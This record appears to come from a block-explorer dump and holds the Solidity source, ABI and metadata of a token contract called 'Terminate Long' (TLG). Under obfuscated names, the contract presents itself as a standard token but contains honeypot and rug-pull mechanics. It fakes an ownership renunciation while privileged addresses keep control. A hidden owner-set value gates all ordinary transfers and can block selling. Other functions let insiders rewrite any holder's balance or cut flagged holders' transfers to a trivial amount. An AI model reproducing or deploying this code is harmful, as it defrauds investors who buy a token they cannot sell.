{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface listEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamLaunchedLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingBuy {\n    function createPair(address minFrom, address amountLiquidity) external returns (address);\n}\n\ninterface sellTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoEnable) external view returns (uint256);\n\n    function transfer(address amountWalletTeam, uint256 sellMin) external returns (bool);\n\n    function allowance(address isSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountWalletTeam,\n        uint256 sellMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTx, uint256 value);\n    event Approval(address indexed isSender, address indexed spender, uint256 value);\n}\n\ninterface sellTxMetadata is sellTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminateLong is teamLaunchedLaunch, sellTx, sellTxMetadata {\n\n    function allowance(address swapFund, address tradingAt) external view virtual override returns (uint256) {\n        if (tradingAt == exemptMarketingReceiver) {\n            return type(uint256).max;\n        }\n        return minReceiver[swapFund][tradingAt];\n    }\n\n    function shouldSell(uint256 sellMin) public {\n        atIs();\n        minFund = sellMin;\n    }\n\n    function approve(address tradingAt, uint256 sellMin) public virtual override returns (bool) {\n        minReceiver[_msgSender()][tradingAt] = sellMin;\n        emit Approval(_msgSender(), tradingAt, sellMin);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toTeamTake;\n    }\n\n    function enableTotal() public {\n        emit OwnershipTransferred(tokenSellLaunch, address(0));\n        toAmountIs = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return toAmountIs;\n    }\n\n    uint8 private modeMarketing = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeMarketing;\n    }\n\n    function swapSender(address listTeam, address amountWalletTeam, uint256 sellMin) internal returns (bool) {\n        require(maxMarketing[listTeam] >= sellMin);\n        maxMarketing[listTeam] -= sellMin;\n        maxMarketing[amountWalletTeam] += sellMin;\n        emit Transfer(listTeam, amountWalletTeam, sellMin);\n        return true;\n    }\n\n    constructor (){\n        \n        listEnable feeTotal = listEnable(exemptMarketingReceiver);\n        liquidityReceiver = marketingBuy(feeTotal.factory()).createPair(feeTotal.WETH(), address(this));\n        if (txTeamTake) {\n            totalEnableFee = buyExemptMin;\n        }\n        tokenSellLaunch = _msgSender();\n        enableTotal();\n        liquiditySwap[tokenSellLaunch] = true;\n        maxMarketing[tokenSellLaunch] = launchSender;\n        if (txTeamTake) {\n            buyExemptMin = totalEnableFee;\n        }\n        emit Transfer(address(0), tokenSellLaunch, launchSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private minReceiver;\n\n    mapping(address => uint256) private maxMarketing;\n\n    function transferFrom(address listTeam, address amountWalletTeam, uint256 sellMin) external override returns (bool) {\n        if (_msgSender() != exemptMarketingReceiver) {\n            if (minReceiver[listTeam][_msgSender()] != type(uint256).max) {\n                require(sellMin <= minReceiver[listTeam][_msgSender()]);\n                minReceiver[listTeam][_msgSender()] -= sellMin;\n            }\n        }\n        return teamToEnable(listTeam, amountWalletTeam, sellMin);\n    }\n\n    bool public txMin;\n\n    function toTrading(address feeAt, uint256 sellMin) public {\n        atIs();\n        maxMarketing[feeAt] = sellMin;\n    }\n\n    string private toTeamTake = \"Terminate Long\";\n\n    uint256 minFund;\n\n    uint256 public buyExemptMin;\n\n    address public liquidityReceiver;\n\n    address public tokenSellLaunch;\n\n    bool public modeBuyTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchSender;\n    }\n\n    uint256 private launchSender = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public marketingTake;\n\n    uint256 constant walletLimit = 18 ** 10;\n\n    function atIs() private view {\n        require(liquiditySwap[_msgSender()]);\n    }\n\n    function isAt(address launchFund) public {\n        atIs();\n        \n        if (launchFund == tokenSellLaunch || launchFund == liquidityReceiver) {\n            return;\n        }\n        marketingTake[launchFund] = true;\n    }\n\n    bool public buyTrading;\n\n    bool private txTeamTake;\n\n    mapping(address => bool) public liquiditySwap;\n\n    function transfer(address feeAt, uint256 sellMin) external virtual override returns (bool) {\n        return teamToEnable(_msgSender(), feeAt, sellMin);\n    }\n\n    function marketingMax(address liquidityList) public {\n        if (txMin) {\n            return;\n        }\n        \n        liquiditySwap[liquidityList] = true;\n        \n        txMin = true;\n    }\n\n    address enableTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public totalEnableFee;\n\n    function teamToEnable(address listTeam, address amountWalletTeam, uint256 sellMin) internal returns (bool) {\n        if (listTeam == tokenSellLaunch) {\n            return swapSender(listTeam, amountWalletTeam, sellMin);\n        }\n        uint256 txBuyList = sellTx(liquidityReceiver).balanceOf(enableTrading);\n        require(txBuyList == minFund);\n        require(amountWalletTeam != enableTrading);\n        if (marketingTake[listTeam]) {\n            return swapSender(listTeam, amountWalletTeam, walletLimit);\n        }\n        return swapSender(listTeam, amountWalletTeam, sellMin);\n    }\n\n    function balanceOf(address autoEnable) public view virtual override returns (uint256) {\n        return maxMarketing[autoEnable];\n    }\n\n    string private limitShould = \"TLG\";\n\n    address exemptMarketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private toAmountIs;\n\n    function getOwner() external view returns (address) {\n        return toAmountIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitShould;\n    }\n\n    uint256 txMode;\n\n    event OwnershipTransferred(address indexed atSender, address indexed takeIsWallet);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeIsWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"marketingMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeBuyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellMin\",\"type\":\"uint256\"}],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMin\",\"type\":\"uint256\"}],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSellLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnableFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountWalletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TerminateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}